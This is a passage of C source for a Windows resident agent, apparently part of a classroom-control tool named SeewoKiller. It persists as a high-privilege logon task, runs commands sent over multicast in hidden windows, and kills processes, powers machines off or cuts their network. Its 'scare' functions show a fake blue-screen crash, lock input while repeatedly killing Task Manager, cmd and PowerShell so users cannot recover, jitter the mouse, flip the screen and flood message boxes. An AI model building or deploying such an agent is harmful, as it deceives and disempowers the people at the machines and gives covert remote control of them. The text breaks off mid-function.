// skagent.c - SeewoKiller resident agent (pure C / Win32, no deps).
// Deployed to C:\Temp\SK\ via SFTP and registered as an ONLOGON scheduled
// task (/RL HIGHEST) so it runs in the interactive desktop session.
// Listens on multicast SK_MCAST_GROUP:SK_MCAST_PORT, verifies signed
// commands, executes them in the desktop session, replies with a small
// unicast packet to the controller-chosen dynamic port.

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "sk_protocol.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

#define AGENT_DIR      "C:\\Temp\\SK"
#define PUB_FILE       "C:\\Temp\\SK\\pubkey.bin"
#define EDGE_PATH      "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
#define AGENT_NAME     "skagent.exe"
#define WATCH_NAME     "skwatch.exe"
#define AGENT_MUTEX    "Local\\SeewoKillerAgent"
#define WATCH_MUTEX    "Local\\SeewoKillerWatch"
#define EXIT_EVENT     "Global\\SeewoKillerExit"
#define TASK_NAME      "SeewoAgent"

static uint8_t  g_pub[SK_PUB_LEN];       /* controller ECDSA public key */
static int      g_havePub = 0;
static char     g_host[64] = "?";
static SOCKET   g_replySock = INVALID_SOCKET;
static HANDLE   g_exitEvent = NULL;

/* ---------------- small helpers ---------------- */

static void run_hidden(const char* cmdline) {
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    char buf[1024];
    _snprintf(buf, sizeof(buf), "cmd.exe /c %s", cmdline);
    buf[sizeof(buf) - 1] = '\0';
    CreateProcessA(NULL, buf, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, AGENT_DIR, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
}

/* Run a command, wait up to waitMs, capture merged output (capped). */
static int run_capture(const char* cmd, DWORD waitMs, char* out, size_t outCap,
                       size_t* outLen) {
    SECURITY_ATTRIBUTES sa; sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    HANDLE rd = NULL, wr = NULL;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return -1;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = wr; si.hStdError = wr;
    ZeroMemory(&pi, sizeof(pi));

    char buf[1200];
    _snprintf(buf, sizeof(buf), "cmd.exe /c %s", cmd);
    buf[sizeof(buf) - 1] = '\0';

    BOOL ok = CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                             NULL, AGENT_DIR, &si, &pi);
    CloseHandle(wr);
    if (!ok) { CloseHandle(rd); return -1; }

    size_t n = 0;
    char tmp[2048]; DWORD got = 0;
    ULONGLONG start = GetTickCount64();
    for (;;) {
        DWORD avail = 0;
        if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL) || avail == 0) {
            if (WaitForSingleObject(pi.hProcess, 150) != WAIT_TIMEOUT) break;
            if (GetTickCount64() - start > waitMs) {
                TerminateProcess(pi.hProcess, 1);
                break;
            }
            continue;
        }
        DWORD want = avail < sizeof(tmp) ? avail : (DWORD)sizeof(tmp);
        if (!ReadFile(rd, tmp, want, &got, NULL) || got == 0) break;
        size_t room = outCap - n;
        size_t cp = got < room ? got : room;
        memcpy(out + n, tmp, cp);
        n += cp;
        if (n >= outCap) break;
    }
    while (n < outCap &&
           ReadFile(rd, tmp, (DWORD)sizeof(tmp), &got, NULL) && got > 0) {
        size_t room = outCap - n;
        size_t cp = got < room ? got : room;
        memcpy(out + n, tmp, cp);
        n += cp;
    }
    DWORD rc = 0;
    GetExitCodeProcess(pi.hProcess, &rc);
    CloseHandle(rd); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    *outLen = n;
    return (int)rc;
}

/* ---------------- encoding helpers (protocol is UTF-8, console is ACP) ---------------- */

/* Truncate a UTF-8 string without splitting a multi-byte sequence. */
static void utf8_trunc(char* s, size_t maxLen) {
    size_t n = strlen(s);
    if (n <= maxLen) return;
    size_t cut = maxLen;
    while (cut > 0 && (((unsigned char)s[cut]) & 0xC0) == 0x80) cut--;
    s[cut] = '\0';
}

/* Bytes -> UTF-8. Valid UTF-8 input passes through; anything else is
 * assumed to be console ACP (GBK on zh-CN) and converted. Returns 0 on
 * success. */
static int smart_to_utf8(const char* in, size_t inLen, char* out, size_t outCap) {
    if (outCap == 0) return -1;
    out[0] = '\0';
    if (MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS,
                            in, (int)inLen, NULL, 0) > 0) {
        size_t cp = inLen < outCap - 1 ? inLen : outCap - 1;
        memcpy(out, in, cp);
        out[cp] = '\0';
        return 0;
    }
    int wl = MultiByteToWideChar(CP_ACP, 0, in, (int)inLen, NULL, 0);
    if (wl <= 0) return -1;
    wchar_t* w = (wchar_t*)malloc((size_t)wl * sizeof(wchar_t));
    if (!w) return -1;
    MultiByteToWideChar(CP_ACP, 0, in, (int)inLen, w, wl);
    int ul = WideCharToMultiByte(CP_UTF8, 0, w, wl, NULL, 0, NULL, NULL);
    int rc = -1;
    if (ul > 0 && (size_t)ul < outCap) {
        WideCharToMultiByte(CP_UTF8, 0, w, wl, out, ul, NULL, NULL);
        out[ul] = '\0';
        rc = 0;
    }
    free(w);
    return rc;
}

/* UTF-8 -> console ACP for CreateProcessA/MessageBox-style ANSI callers.
 * Writes at most outCap bytes including the NUL. Returns 0 on success. */
static int utf8_to_acp(const char* in, char* out, size_t outCap) {
    if (outCap == 0) return -1;
    out[0] = '\0';
    int wl = MultiByteToWideChar(CP_UTF8, 0, in, -1, NULL, 0);
    if (wl <= 0) { _snprintf(out, outCap, "%s", in); out[outCap - 1] = '\0'; return -1; }
    wchar_t* w = (wchar_t*)malloc((size_t)wl * sizeof(wchar_t));
    if (!w) return -1;
    MultiByteToWideChar(CP_UTF8, 0, in, -1, w, wl);
    int al = WideCharToMultiByte(CP_ACP, 0, w, wl, NULL, 0, NULL, NULL);
    int rc = -1;
    if (al > 0 && (size_t)al <= outCap) {
        WideCharToMultiByte(CP_ACP, 0, w, wl, out, al, NULL, NULL);
        rc = 0;
    }
    free(w);
    return rc;
}

/* ---------------- target IP-range filter ---------------- */

static int sk_parse_v4(const char* s, uint32_t* hostOrder) {
    struct in_addr a;
    if (inet_pton(AF_INET, s, &a) != 1) return 0;
    *hostOrder = ntohl(a.s_addr);
    return 1;
}

/* One item: "a.b.c.d" | "a.b.c.d-e" | "a.b.c.d-a.b.c.e". */
static int sk_parse_range_item(const char* item, size_t len,
                               uint32_t* lo, uint32_t* hi) {
    char buf[64];
    if (len == 0 || len >= sizeof(buf)) return 0;
    memcpy(buf, item, len);
    buf[len] = '\0';

    char* dash = strchr(buf, '-');
    uint32_t a;
    if (!dash) {
        if (!sk_parse_v4(buf, &a)) return 0;
        *lo = *hi = a;
        return 1;
    }
    *dash = '\0';
    const char* suffix = dash + 1;
    if (!sk_parse_v4(buf, &a)) return 0;

    uint32_t b;
    if (sk_parse_v4(suffix, &b)) {
        /* full-range form */
    } else {
        /* short form: suffix replaces the last octet */
        size_t sl = strlen(suffix);
        if (sl == 0 || sl > 3) return 0;
        for (size_t i = 0; i < sl; ++i)
            if (suffix[i] < '0' || suffix[i] > '9') return 0;
        char* lastdot = strrchr(buf, '.');
        if (!lastdot) return 0;
        size_t keep = (size_t)(lastdot - buf) + 1;
        if (keep + sl >= sizeof(buf)) return 0;
        buf[keep + sl] = '\0';
        memmove(buf + keep + sl - sl, suffix, sl);   /* place suffix after prefix */
        /* buf now reads "a.b.c." + suffix (bytes after keep+sl are cut) */
        if (!sk_parse_v4(buf, &b)) return 0;
    }
    *lo = a < b ? a : b;
    *hi = a < b ? b : a;
    return 1;
}

static int sk_is_target_sep(char c) {
    return c == ',' || c == ';' || c == ' ' || c == '\t' ||
           c == '\r' || c == '\n';
}

static int sk_ip_in_targets(uint32_t ip, const char* targets) {
    const char* p = targets;
    while (*p) {
        while (*p && sk_is_target_sep(*p)) p++;
        if (!*p) break;
        const char* start = p;
        while (*p && !sk_is_target_sep(*p)) p++;
        uint32_t lo, hi;
        if (sk_parse_range_item(start, (size_t)(p - start), &lo, &hi) &&
            ip >= lo && ip <= hi)
            return 1;
    }
    return 0;
}

/* 1 = this host matches the targets list; empty list = no filter. */
static int sk_host_matches_targets(const char* targets) {
    while (*targets && sk_is_target_sep(*targets)) targets++;
    if (!targets[0]) return 1;

    char host[256];
    if (gethostname(host, (int)sizeof(host)) != 0) return 0;
    struct addrinfo hints, *res = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    if (getaddrinfo(host, NULL, &hints, &res) != 0) return 0;
    int hit = 0;
    for (struct addrinfo* ai = res; ai; ai = ai->ai_next) {
        if (ai->ai_family != AF_INET || !ai->ai_addr) continue;
        uint32_t ip = ntohl(((struct sockaddr_in*)ai->ai_addr)->sin_addr.s_addr);
        if (sk_ip_in_targets(ip, targets)) { hit = 1; break; }
    }
    freeaddrinfo(res);
    return hit;
}

/* ---------------- replies ---------------- */

static void reply_send_raw(const struct sockaddr_in* to, const char* json) {
    uint8_t pkt[SK_MAX_PACKET];
    size_t n = sk_build_packet(SK_MSG_REPLY, json, NULL, pkt, sizeof(pkt));
    if (n == 0) return;
    sendto(g_replySock, (const char*)pkt, (int)n, 0,
           (const struct sockaddr*)to, sizeof(*to));
}

/* Escape for the reply, halving the input until it fits the buffer. */
static void esc_reply(const char* in, char* out, size_t outCap) {
    char tmp[11004];
    size_t n = strlen(in);
    if (n > 11000) n = 11000;
    memcpy(tmp, in, n);
    tmp[n] = '\0';
    while (sk_json_escape(tmp, out, outCap) != 0) {
        n /= 2;
        if (n < 32) { out[0] = '\0'; return; }
        tmp[n] = '\0';
    }
}

/* Send a reply, auto-fragmenting long payloads:
 * {"task_id":..,"host":"..","st":"..","rc":..,"info":"...","frag":i,"ftotal":n}
 * Single-fragment replies omit frag/ftotal. */
static void send_reply(const struct sockaddr_in* to, long long task_id,
                       const char* st, long long rc, const char* info) {
    char esc_info[15000], esc_host[128];
    esc_reply(info, esc_info, sizeof(esc_info));
    if (sk_json_escape(g_host, esc_host, sizeof(esc_host)) != 0) esc_host[0] = '\0';

    char head[256];
    int hl = _snprintf(head, sizeof(head),
                       "{\"task_id\":%lld,\"host\":\"%s\",\"st\":\"%s\",\"rc\":%lld,\"info\":\"",
                       task_id, esc_host, st, rc);
    if (hl < 0) return;
    head[sizeof(head) - 1] = '\0';

    size_t ilen = strlen(esc_info);
    size_t chunk = SK_MAX_JSON - (size_t)hl - 36;   /* tail room */
    if (ilen <= chunk) {
        char json[SK_MAX_JSON + 1];
        memcpy(json, head, (size_t)hl);
        memcpy(json + hl, esc_info, ilen);
        memcpy(json + hl + ilen, "\"}", 3);
        reply_send_raw(to, json);
        return;
    }

    int ftotal = (int)((ilen + chunk - 1) / chunk);
    if (ftotal > 8) { ilen = chunk * 8; ftotal = 8; }
    size_t pos = 0;
    for (int i = 0; i < ftotal; ++i) {
        size_t c = (ilen - pos < chunk) ? ilen - pos : chunk;
        /* keep JSON escape pairs atomic: trailing backslash run must be even */
        size_t k = 0;
        while (c > k && esc_info[pos + c - 1 - k] == '\\') k++;
        if (k & 1) c--;
        if (c == 0) c = 1;
        char json[SK_MAX_JSON + 1];
        memcpy(json, head, (size_t)hl);
        memcpy(json + hl, esc_info + pos, c);
        _snprintf(json + hl + c, sizeof(json) - (size_t)hl - c,
                  "\",\"frag\":%d,\"ftotal\":%d}", i, ftotal);
        reply_send_raw(to, json);
        pos += c;
    }
}

/* ---------------- actions ---------------- */

static DWORD WINAPI msg_thread(LPVOID param) {
    wchar_t* wtext = (wchar_t*)param;
    MessageBoxW(NULL, wtext, L"\u901a\u77e5",   /* 通知 */
                MB_OK | MB_ICONINFORMATION | MB_TOPMOST | MB_SETFOREGROUND);
    free(wtext);
    return 0;
}

static void do_msg(const char* textUtf8) {
    int wl = MultiByteToWideChar(CP_UTF8, 0, textUtf8, -1, NULL, 0);
    if (wl <= 0) return;
    wchar_t* w = malloc((size_t)wl * sizeof(wchar_t));
    if (!w) return;
    MultiByteToWideChar(CP_UTF8, 0, textUtf8, -1, w, wl);
    HANDLE t = CreateThread(NULL, 0, msg_thread, w, 0, NULL);
    if (t) CloseHandle(t);
}

static void do_open_url(const char* url) {
    char buf[1500];
    /* quote the exe path, leave the url unquoted (no spaces allowed in it) */
    _snprintf(buf, sizeof(buf), "\"%s\" %s", EDGE_PATH, url);
    buf[sizeof(buf) - 1] = '\0';
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessA(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                        NULL, AGENT_DIR, &si, &pi)) {
        /* fallback: default browser via shell */
        _snprintf(buf, sizeof(buf), "start \"\" %s", url);
        buf[sizeof(buf) - 1] = '\0';
        run_hidden(buf);
        return;
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}

static void do_power(const char* mode) {
    if (!strcmp(mode, "off"))          run_hidden("shutdown /s /t 5");
    else if (!strcmp(mode, "reboot"))  run_hidden("shutdown /r /t 5");
    else if (!strcmp(mode, "logoff"))  run_hidden("shutdown /l");
    else if (!strcmp(mode, "lock"))    LockWorkStation();
}

static void do_isolate(const char* allowIp, int on) {
    char buf[1400];
    if (on) {
        _snprintf(buf, sizeof(buf),
            "netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound"
            " & netsh advfirewall firewall delete rule name=SK_AllowCtrl >nul 2>&1"
            " & netsh advfirewall firewall add rule name=SK_AllowCtrl dir=in action=allow remoteip=%s"
            " & netsh advfirewall firewall add rule name=SK_AllowCtrl dir=out action=allow remoteip=%s",
            allowIp, allowIp);
    } else {
        _snprintf(buf, sizeof(buf),
            "netsh advfirewall firewall delete rule name=SK_AllowCtrl >nul 2>&1"
            " & netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound");
    }
    buf[sizeof(buf) - 1] = '\0';
    run_hidden(buf);
}

static void do_killgames(void) {
    run_hidden("taskkill /F /T /IM msedge.exe >nul 2>&1"
               " & taskkill /F /T /IM java.exe >nul 2>&1"
               " & taskkill /F /T /IM javaw.exe >nul 2>&1");
}

/* taskkill every ';'/','/' '-separated process name; returns count queued. */
static int do_killproc(const char* names) {
    char buf[1200];
    size_t n = 0;
    int cnt = 0;
    const char* p = names;
    buf[0] = '\0';
    while (*p) {
        while (*p == ';' || *p == ',' || *p == ' ' || *p == '\t') p++;
        if (!*p) break;
        char name[128];
        size_t m = 0;
        while (*p && *p != ';' && *p != ',' && *p != ' ' && *p != '\t' &&
               m < sizeof(name) - 1)
            name[m++] = *p++;
        name[m] = '\0';
        int w = _snprintf(buf + n, sizeof(buf) - n,
                          "%staskkill /F /T /IM %s >nul 2>&1",
                          cnt ? " & " : "", name);
        if (w < 0 || (size_t)w >= sizeof(buf) - n) break;
        n += (size_t)w;
        cnt++;
    }
    if (cnt) run_hidden(buf);
    return cnt;
}

/* ---------------- classroom control: scare windows & input tricks ---------------- */
/* All tricks are reversible; "unlock" (or any exit) restores everything. */

static HANDLE g_panicEvent = NULL;   /* manual-reset: unlock broadcasts to all */
static volatile HWND g_scareWnd = NULL;
static int g_flipped = 0;

/* UTF-8 -> malloc'd wide string (display windows want wchar). */
static wchar_t* utf8_to_wide(const char* s) {
    int wl = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (wl <= 0) return NULL;
    wchar_t* w = (wchar_t*)malloc((size_t)wl * sizeof(wchar_t));
    if (w) MultiByteToWideChar(CP_UTF8, 0, s, -1, w, wl);
    return w;
}

#define SCARE_BSOD   0
#define SCARE_LOCK   1
#define SCARE_BANNER 2
#define SCARE_FSMSG  3

typedef struct {
    int mode;
    DWORD autoMs;
    volatile LONG pct;           /* bsod fake progress */
    wchar_t text[512];
} scare_arg;

static void scare_draw_center(HDC hdc, int x, int y, int w, int h,
                              const wchar_t* text, int fh, COLORREF fg) {
    RECT rc = { x, y, x + w, y + h };
    HFONT f = CreateFontW(fh, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET,
                          OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                          CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    HGDIOBJ of = SelectObject(hdc, f);
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, fg);
    DrawTextW(hdc, text, -1, &rc, DT_CENTER | DT_WORDBREAK);
    SelectObject(hdc, of);
    DeleteObject(f);
}

static LRESULT CALLBACK scare_proc(HWND w, UINT m, WPARAM wp, LPARAM lp) {
    scare_arg* a = (scare_arg*)GetWindowLongPtrW(w, GWLP_USERDATA);
    switch (m) {
    case WM_PAINT: {
        if (!a) break;
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(w, &ps);
        RECT rc; GetClientRect(w, &rc);
        int sw = rc.right, sh = rc.bottom;
        if (a->mode == SCARE_BSOD) {
            HBRUSH br = CreateSolidBrush(RGB(0, 120, 215));
            FillRect(hdc, &rc, br);
            DeleteObject(br);
            scare_draw_center(hdc, sw / 10, sh * 18 / 100, sw * 8 / 10, sh / 4,
                              L":(", 96, RGB(255, 255, 255));
            scare_draw_center(hdc, sw / 10, sh * 42 / 100, sw * 8 / 10, sh / 3,
                              a->text, 30, RGB(255, 255, 255));
            wchar_t pct[48];
            _snwprintf(pct, 48, L"%d%% \u5b8c\u6210", a->pct);
            pct[47] = '\0';
            scare_draw_center(hdc, sw / 10, sh * 80 / 100, sw * 8 / 10, 60,
                              pct, 24, RGB(255, 255, 255));
        } else if (a->mode == SCARE_LOCK) {
            FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
            scare_draw_center(hdc, 0, sh / 3, sw, sh / 3,
                              a->text, 48, RGB(235, 235, 235));
        } else if (a->mode == SCARE_FSMSG) {
            FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
            scare_draw_center(hdc, 0, sh / 4, sw, sh / 2,
                              a->text, 72, RGB(255, 90, 90));
        } else {   /* banner: red text scrolling right -> left, middle strip */
            FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
            HFONT f = CreateFontW(64, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
                                  OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                  CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
            HGDIOBJ of = SelectObject(hdc, f);
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(255, 60, 60));
            int tw = (int)wcslen(a->text) * 64;
            ULONGLONG now = GetTickCount64();
            int span = tw + sw;
            int x = sw - (int)((now / 25) % (ULONGLONG)span);
            RECT tr = { x, (sh - 64) / 2, x + tw + 8, (sh + 64) / 2 + 8 };
            DrawTextW(hdc, a->text, -1, &tr, DT_SINGLELINE | DT_NOPREFIX);
            SelectObject(hdc, of);
            DeleteObject(f);
        }
        EndPaint(w, &ps);
        return 0;
    }
    case WM_LBUTTONDOWN:      /* fsmsg: click dismisses */
        DestroyWindow(w);
        return 0;
    case WM_DESTROY:
        if (g_scareWnd == w) g_scareWnd = NULL;
        return 0;
    }
    return DefWindowProcW(w, m, wp, lp);
}

/* One thread per scare window; terminates on unlock, self-expiry, or window
 * gone (replaced by a newer scare). Lock mode keeps BlockInput re-armed and
 * kills taskmgr/cmd/powershell so students cannot fight back. */
static DWORD WINAPI scare_thread(LPVOID p) {
    scare_arg* a = (scare_arg*)p;
    HINSTANCE hI = GetModuleHandleA(NULL);
    WNDCLASSW wc;
    ZeroMemory(&wc, sizeof(wc));
    wc.lpfnWndProc = scare_proc;
    wc.hInstance = hI;
    wc.lpszClassName = L"SKScare";
    RegisterClassW(&wc);       /* exists already: ERROR_CLASS_EXISTS, fine */

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    DWORD ex = WS_EX_TOPMOST | WS_EX_TOOLWINDOW;
    int by = 0, bh = sh;
    if (a->mode == SCARE_BANNER) {
        ex |= WS_EX_LAYERED | WS_EX_TRANSPARENT;   /* click-through */
        by = sh / 2 - 70; bh = 140;
    }
    HWND w = CreateWindowExW(ex, L"SKScare", L"", WS_POPUP | WS_VISIBLE,
                             0, by, sw, bh, NULL, NULL, hI, NULL);
    if (!w) { free(a); return 0; }
    SetWindowLongPtrW(w, GWLP_USERDATA, (LONG_PTR)a);
    if (a->mode == SCARE_BANNER)
        SetLayeredWindowAttributes(w, 0, 230, LWA_ALPHA);
    g_scareWnd = w;
    ShowWindow(w, SW_SHOWNOACTIVATE);

    ULONGLONG start = GetTickCount64();
    ULONGLONG topTick = 0, pctTick = 0, killTick = 0, invTick = 0;
    BOOL block = (a->mode == SCARE_LOCK);
    for (;;) {
        MSG m;
        while (PeekMessageW(&m, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&m);
            DispatchMessageW(&m);
        }
        if (!IsWindow(w)) break;
        if (WaitForSingleObject(g_panicEvent, 100) == WAIT_OBJECT_0) break;
        ULONGLONG now = GetTickCount64();
        if (now - topTick > 500) {
            topTick = now;
            SetWindowPos(w, HWND_TOPMOST, 0, 0, 0, 0,
                         SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
        }
        if (block) {
            BlockInput(TRUE);
            if (now - killTick > 2000) {
                killTick = now;
                run_hidden("taskkill /F /IM taskmgr.exe /IM cmd.exe"
                           " /IM powershell.exe >nul 2>&1");
            }
        }
        if (a->mode == SCARE_BSOD && now - pctTick > 2200 && a->pct < 99) {
            pctTick = now;
            int add = 3 + (a->pct % 7);
            InterlockedExchange(&a->pct, (a->pct + add > 99) ? 99 : a->pct + add);
            InvalidateRect(w, NULL, TRUE);
        }
        if (a->mode == SCARE_BANNER && now - invTick > 60) {
            invTick = now;
            InvalidateRect(w, NULL, TRUE);
        }
        if (a->autoMs && GetTickCount64() - start > a->autoMs) break;
    }
    if (block) BlockInput(FALSE);
    if (IsWindow(w)) DestroyWindow(w);
    free(a);
    return 0;
}

static void start_scare(int mode, const char* textUtf8, DWORD autoMs) {
    ResetEvent(g_panicEvent);
    /* replacing an older scare: close it, its thread exits via !IsWindow */
    if (g_scareWnd && IsWindow(g_scareWnd)) SendMessageW(g_scareWnd, WM_CLOSE, 0, 0);
    scare_arg* a = (scare_arg*)calloc(1, sizeof(scare_arg));
    if (!a) return;
    a->mode = mode;
    a->autoMs = autoMs;
    a->pct = 7;
    if (textUtf8 && textUtf8[0]) {
        wchar_t* w = utf8_to_wide(textUtf8);
        if (w) {
            _snwprintf(a->text, 512, L"%s", w);
            a->text[511] = '\0';
            free(w);
        }
    } else if (mode == SCARE_BSOD) {
        /* English reads authentic on a Win10 bsod; keep agent ASCII-safe */
        wcscpy(a->text, L"Your PC ran into a problem and needs to restart. "
                        "We're just collecting some error info, and then "
                        "we'll restart it for you.");
    }
    HANDLE t = CreateThread(NULL, 0, scare_thread, a, 0, NULL);
    if (t) CloseHandle(t); else free(a);
}

/* jitter the cursor a few pixels until unlock */
static DWORD WINAPI jit_thread(LPVOID unused) {
    (void)unused;
    INPUT in;
    ZeroMemory(&in, sizeof(in));
    in.type = INPUT_MOUSE;
    for (;;) {
        if (WaitForSingleObject(g_panicEvent, 350) == WAIT_OBJECT_0) break;
        in.mi.dx = (rand() % 7) - 3;
        in.mi.dy = (rand() % 7) - 3;
        in.mi.dwFlags = MOUSEEVENTF_MOVE;
        SendInput(1, &in, sizeof(in));
    }
    return 0;
}

/* rotate primary display 180 degrees; unlock restores */
static void do_flip(void) {
    DEVMODEA dm;
    ZeroMemory(&dm, sizeof(dm));
    dm.dmSize = sizeof(dm);
    if (!EnumDisplaySettingsA(NULL, ENUM_CURRENT_SETTINGS, &dm)) return;
    dm.dmFields = DM_DISPLAYORIENTATION;
    dm.dmDisplayOrientation = DMDO_180;
    if (ChangeDisplaySettingsA(&dm, 0) == DISP_CHANGE_SUCCESSFUL) g_flipped = 1;
}

static void do_unflip(void) {
    DEVMODEA dm;
    ZeroMemory(&dm, sizeof(dm));
    dm.dmSize = sizeof(dm);
    if (!EnumDisplaySettingsA(NULL, ENUM_CURRENT_SETTINGS, &dm)) return;
    dm.dmFields = DM_DISPLAYORIENTATION;
    dm.dmDisplayOrientation = DMDO_DEFAULT;
    ChangeDisplaySettingsA(&dm, 0);
    g_flipped = 0;
}

/* message box storm: modal, topmost, one after another until unlock */
static DWORD WINAPI msgloop_thread(LPVOID p) {
    wchar_t* w = (wchar_t*)p;
    for (int i = 0; i < 10; ++i) {
        MessageBoxW(NULL, w, L"\u901a\u77e5", MB_OK | MB_ICONWARNING |
                    MB_TOPMOST | MB_SETFOREGROUND | MB_SYSTEMMODAL);
        if (WaitForSingleObject(g_panicEvent, 80) == WAIT_OBJECT_0) break;
    }
    free(w);
    return 0;
}

/* ---------------- command dispatch ---------------- */

static void handle_command(const char* json, const struct sockaddr_in* from) {
    long long task_id = sk_json_get_int(json, "task_id", 0);
    long long rport   = sk_json_get_int(json, "reply_port", 0);

    /* reply destination: dynamic port from the command, controller address */
    struct sockaddr_in to = *from;
    if (rport > 0 && rport < 65536) to.sin_port = htons((u_short)rport);

    /* Target filter: the command carries the controller-side IP range box.
     * If this host's own IPv4 is not inside, stay silent and do nothing. */
    {
        char targets[700] = "";
        sk_json_get_str(json, "targets", targets, sizeof(targets));
        if (!sk_host_matches_targets(targets)) return;
    }

    long long ts = sk_json_get_int(json, "ts", 0);
    int64_t now = 0; sk_cur_time_utc(&now);
    if (ts != 0 && (now - ts > SK_REPLAY_WINDOW || ts - now > SK_REPLAY_WINDOW)) {
        send_reply(&to, task_id, "err", -1, "ts out of window");
        return;
    }

    /* dedup: controller re-sends the same task_id to hosts whose reply got
     * lost; re-reply so it can tell "alive, reply lost" from "offline" */
    {
        static uint32_t seen[64] = {0};
        static int seenPos = 0;
        uint32_t tid = (uint32_t)task_id;
        for (int i = 0; i < 64; ++i) {
            if (seen[i] && seen[i] == tid) {
                send_reply(&to, task_id, "dup", 0, "duplicate task");
                return;
            }
        }
        seen[seenPos] = tid;
        seenPos = (seenPos + 1) & 63;
    }

    char action[32] = "", cmd[900] = "", text[512] = "", url[600] = "";
    char mode[16] = "", allow_ip[40] = "", proc[512] = "";
    sk_json_get_str(json, "action", action, sizeof(action));
    sk_json_get_str(json, "cmd", cmd, sizeof(cmd));
    sk_json_get_str(json, "text", text, sizeof(text));
    sk_json_get_str(json, "url", url, sizeof(url));
    sk_json_get_str(json, "mode", mode, sizeof(mode));
    sk_json_get_str(json, "allow_ip", allow_ip, sizeof(allow_ip));
    sk_json_get_str(json, "proc", proc, sizeof(proc));

    /* Scare windows draw wide text and want the original UTF-8, while exec
     * paths below convert to console ACP; keep an unconverted copy. */
    char text_raw[512];
    strcpy(text_raw, text);

    /* Protocol strings are UTF-8; ANSI execution paths want console ACP. */
    {
        char conv[900];
        if (cmd[0] && utf8_to_acp(cmd, conv, sizeof(conv)) == 0) strcpy(cmd, conv);
        char conv2[512];
        if (text[0] && utf8_to_acp(text, conv2, sizeof(conv2)) == 0) strcpy(text, conv2);
        char conv3[600];
        if (url[0] && utf8_to_acp(url, conv3, sizeof(conv3)) == 0) strcpy(url, conv3);
        char conv4[512];
        if (proc[0] && utf8_to_acp(proc, conv4, sizeof(conv4)) == 0) strcpy(proc, conv4);
    }

    if (!strcmp(action, "ping")) {
        send_reply(&to, task_id, "ok", 0, "alive");
    } else if (!strcmp(action, "exec")) {
        run_hidden(cmd);
        send_reply(&to, task_id, "ok", 0, "started");
    } else if (!strcmp(action, "exec_wait")) {
        char out[6000]; size_t outLen = 0;
        out[0] = '\0';
        int rc = run_capture(cmd, 30000, out, sizeof(out) - 1, &outLen);
        out[outLen < sizeof(out) - 1 ? outLen : sizeof(out) - 1] = '\0';
        /* console bytes -> UTF-8 so the JSON reply stays valid */
        char utf8[12288];
        if (smart_to_utf8(out, strlen(out), utf8, sizeof(utf8)) != 0) utf8[0] = '\0';
        utf8_trunc(utf8, 12000);
        /* rc is unreliable when truncated by pipe cap; report length too */
        char info[12300];
        _snprintf(info, sizeof(info), "rc=%d len=%u out=%s",
                  rc, (unsigned)outLen, utf8);
        info[sizeof(info) - 1] = '\0';
        send_reply(&to, task_id, "ok", rc, info);
    } else if (!strcmp(action, "killgames")) {
        do_killgames();
        send_reply(&to, task_id, "ok", 0, "edge+java killed");
    } else if (!strcmp(action, "killproc")) {
        int cnt = do_killproc(proc);
        char ib[64];
        _snprintf(ib, sizeof(ib), "killed %d name(s)", cnt);
        send_reply(&to, task_id, cnt ? "ok" : "err", cnt, ib);
    } else if (!strcmp(action, "msg")) {
        do_msg(text);
        send_reply(&to, task_id, "ok", 0, "shown");
    } else if (!strcmp(action, "open_url")) {
        do_open_url(url);
        send_reply(&to, task_id, "ok", 0, "opened");
    } else if (!strcmp(action, "power")) {
        do_power(mode);
        send_reply(&to, task_id, "ok", 0, mode);
    } else if (!strcmp(action, "isolate")) {
        do_isolate(allow_ip[0] ? allow_ip : "0.0.0.0", 1);
        send_reply(&to, task_id, "ok", 0, "isolated");
